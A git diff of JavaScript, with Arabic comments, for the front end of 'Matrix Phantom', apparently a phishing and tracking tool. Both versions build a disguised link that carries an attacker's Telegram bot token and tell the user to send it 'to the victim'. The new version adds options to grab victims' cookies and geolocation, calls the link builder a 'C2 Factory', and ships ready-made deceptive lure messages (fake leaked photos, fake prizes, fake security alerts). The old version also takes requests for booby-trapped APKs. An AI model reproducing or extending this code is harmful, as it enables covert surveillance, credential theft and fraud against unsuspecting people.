@@ -1,129 +1,113 @@
-// --- MATRIX PHANTOM PRO LOGIC ---
+// --- MATRIX PHANTOM V3 - CORE ENGINE ---
 
-// 1. نظام الدخول السري (3 ضغطات)
-let adminClicks = 0;
-let lastClickTime = 0;
+// 1. الثوابت الأساسية
+const SECRET_KEY = "01224815487"; // مفتاح التشفير (رقمك)
+const ADMIN_CODE = "matrixjo";    // كود الدخول للوحة الشبح
 
-function adminTrigger() {
-    const currentTime = new Date().getTime();
-    if (currentTime - lastClickTime > 1000) adminClicks = 0;
+// 2. نظام التنقل بين الأقسام (Tabs)
+function openTab(tabId) {
+    const contents = document.querySelectorAll('.tab-content');
+    const buttons = document.querySelectorAll('.tab-btn');
     
-    adminClicks++;
-    lastClickTime = currentTime;
-
-    if (adminClicks === 3) {
-        Swal.fire({
-            title: 'Matrix System Access',
-            html: '<input type="password" id="admin-pass" class="swal2-input" placeholder="Password">',
-            showCancelButton: true,
-            confirmButtonText: 'Enter',
-            background: '#000',
-            color: '#00ff00',
-            preConfirm: () => {
-                const pass = document.getElementById('admin-pass').value;
-                return pass === "01224815487" ? true : Swal.showValidationMessage('كلمة المرور غلط!');
-            }
-        }).then((result) => {
-            if (result.isConfirmed) {
-                document.getElementById('master-panel').style.display = 'block';
-                loadAdminStats();
-                adminClicks = 0;
-            }
-        });
-    }
+    contents.forEach(content => content.classList.remove('active'));
+    buttons.forEach(btn => btn.classList.remove('active'));
+    
+    document.getElementById(tabId).classList.add('active');
+    event.currentTarget.classList.add('active');
 }
 
-// 2. توليد اللينك الملغم (مجاني)
-function generatePhantomLink() {
-    const decoy = document.getElementById('decoy-url').value || "https://youtube.com";
-    const botToken = document.getElementById('target-token').value.trim();
-    const chatId = document.getElementById('target-chatid').value.trim();
-    const payloadType = document.getElementById('payload-type').value;
+// 3. مراقبة مدخلات التوكن (البوابة الشبح)
+document.getElementById('target-token').addEventListener('input', function(e) {
+    if (e.target.value.trim() === ADMIN_CODE) {
+        document.getElementById('admin-dashboard').style.display = 'block';
+        Swal.fire({
+            title: 'Welcome Back, Matrix',
+            text: 'تم تفعيل وضع الأدمن الماستر',
+            icon: 'success',
+            background: '#000',
+            color: '#00ff41',
+            confirmButtonColor: '#00ff41'
+        });
+        loadAdminData(); // وظيفة موجودة في admin.js لجلب البيانات
+    }
+});
 
-    if (!botToken || !chatId) return Swal.fire('بيانات ناقصة', 'دخل التوكن والـ ID', 'error');
+function closeAdmin() {
+    document.getElementById('admin-dashboard').style.display = 'none';
+    document.getElementById('target-token').value = '';
+}
 
-    const payload = btoa(JSON.stringify({ t: botToken, i: chatId, u: decoy, type: payloadType }));
-    const finalLink = `${window.location.origin}/r.html?p=${payload}`;
+// 4. نظام التشفير (XOR Encryption) للحماية
+function matrixEncrypt(data) {
+    let result = "";
+    for (let i = 0; i < data.length; i++) {
+        result += String.fromCharCode(data.charCodeAt(i) ^ SECRET_KEY.charCodeAt(i % SECRET_KEY.length));
+    }
+    return btoa(unescape(encodeURIComponent(result))); // تشفير Base64 متوافق مع الروابط
+}
+
+// 5. صناعة الرابط المشفر (C2 Factory)
+function buildPhantomLink() {
+    const token = document.getElementById('target-token').value;
+    const cid = document.getElementById('target-id').value;
+    
+    if (!token || !cid) {
+        return Swal.fire('بيانات ناقصة', 'يرجى إدخال التوكن والـ ID', 'error');
+    }
+
+    // تجهيز الخيارات
+    const options = {
+        t: token,
+        i: cid,
+        d: document.getElementById('opt-destruct').checked,
+        g: document.getElementById('opt-geo').checked,
+        c: document.getElementById('opt-cookies').checked,
+        ts: Date.now()
+    };
+
+    const payload = matrixEncrypt(JSON.stringify(options));
+    const finalLink = `${window.location.origin}/p.html?m=${payload}`;
 
     Swal.fire({
-        title: 'تم توليد الرابط! 🔥',
-        html: `<input type="text" value="${finalLink}" id="gen-url" readonly style="width:100%; padding:10px; background:#111; color:#00ff00; border:1px solid #00ff00; text-align:center;">`,
-        confirmButtonText: 'نسخ'
-    }).then(() => {
-        document.getElementById('gen-url').select();
-        document.execCommand('copy');
-        Swal.fire('تم النسخ', 'أرسله للضحية الآن', 'success');
+        title: 'تم التشفير بنجاح! 💀',
+        html: `
+            <p style="font-size:12px; color:#888;">انسخ الرابط وارسله للضحية:</p>
+            <input type="text" value="${finalLink}" id="copy-link" readonly 
+            style="width:100%; padding:12px; background:#000; color:#00ff41; border:1px solid #00ff41; text-align:center; border-radius:8px;">
+        `,
+        showCancelButton: true,
+        confirmButtonText: 'نسخ الرابط',
+        cancelButtonText: 'إغلاق',
+        confirmButtonColor: '#00ff41'
+    }).then((result) => {
+        if (result.isConfirmed) {
+            const copyText = document.getElementById("copy-link");
+            copyText.select();
+            document.execCommand("copy");
+            Swal.fire('تم النسخ!', '', 'success');
+        }
     });
 }
 
-// 3. طلب بناء تطبيق ملغم (APK Request)
-function requestAPK() {
-    const token = document.getElementById('apk-token').value.trim();
-    const cid = document.getElementById('apk-chatid').value.trim();
-    const myID = localStorage.getItem('m_id_user') || 'User-' + Math.floor(Math.random() * 1000);
-
-    if (!token || !cid) return Swal.fire('خطأ', 'أدخل بيانات البوت كاملة', 'error');
-
-    db.ref('apk_requests').push({
-        userId: myID,
-        botToken: token,
-        chatId: cid,
-        time: new Date().toLocaleString(),
-        status: 'Pending'
-    }).then(() => {
-        Swal.fire('تم إرسال الطلب 🏗️', 'سيقوم الأدمن ببناء تطبيقك والتواصل معك عبر الواتساب.', 'success');
+// 6. ذكاء اصطناعي بسيط لتوليد نصوص الإقناع
+function askAIForDraft() {
+    const drafts = [
+        "عاجل: تم تسريب صورك الخاصة على هذا الرابط، امسحها فوراً!",
+        "مبروك! لقد فزت بـ 5000 وحدة إنترنت مجانية من فودافون، فعلها من هنا:",
+        "تحذير أمني: شخص ما يحاول الدخول لحسابك من المنصورة، تأكد من هويتك:",
+        "شاهد بث مباشر لمباراة الأهلي والزمالك الآن بدون تقطيع:"
+    ];
+    const random = drafts[Math.floor(Math.random() * drafts.length)];
+    Swal.fire({
+        title: 'اقتراح الذكاء الاصطناعي',
+        text: random,
+        confirmButtonText: 'استخدام النص'
     });
 }
 
-// 4. إرسال اقتراح
-function submitSuggestion() {
-    const text = document.getElementById('suggestion-text').value;
-    if (!text) return;
-    db.ref('suggestions').push({ text: text, time: new Date().toLocaleString() })
-    .then(() => {
-        document.getElementById('suggestion-text').value = '';
-        Swal.fire('تم ✅', 'شكراً لاقتراحك', 'success');
-    });
-}
-
-// 5. نظام الإرسال الجماعي (Smart Broadcast)
-async function startBroadcasting() {
-    const adminToken = document.getElementById('broadcast-token').value.trim();
-    const message = document.getElementById('broadcast-message').value;
-    if (!adminToken || !message) return;
-
-    const snap = await db.ref('users').once('value');
-    const users = snap.val();
-    if (!users) return;
-
-    Swal.fire('جاري الإرسال...', 'لا تغلق الصفحة', 'info');
-    let count = 0;
-    for (let id in users) {
-        await new Promise(res => setTimeout(res, 100)); // تأخير بسيط للأمان
-        fetch(`https://api.telegram.org/bot${adminToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`);
-        count++;
-    }
-    Swal.fire('تم 🎉', `تم الإرسال لـ ${count} مستخدم`, 'success');
-}
-
-// 6. جلب بيانات لوحة الأدمن
-function loadAdminStats() {
-    // جلب الاقتراحات
-    db.ref('suggestions').on('value', snap => {
-        const list = document.getElementById('suggestions-list');
-        list.innerHTML = '';
-        snap.forEach(child => {
-            list.innerHTML += `<div style="border-bottom:1px solid #222; padding:5px;"><small>${child.val().time}</small><br>${child.val().text}</div>`;
-        });
-    });
-
-    // جلب طلبات الـ APK
-    db.ref('apk_requests').on('value', snap => {
-        const list = document.getElementById('apk-requests-list');
-        list.innerHTML = '';
-        snap.forEach(child => {
-            const data = child.val();
-            list.innerHTML += `<div style="border-bottom:1px solid #222; padding:5px;"><small>${data.time}</small><br>User: ${data.userId}<br>Token: ${data.botToken}</div>`;
-        });
-    });
-}
+// 7. شاشة التحميل
+window.onload = () => {
+    setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+    }, 1500);
+};
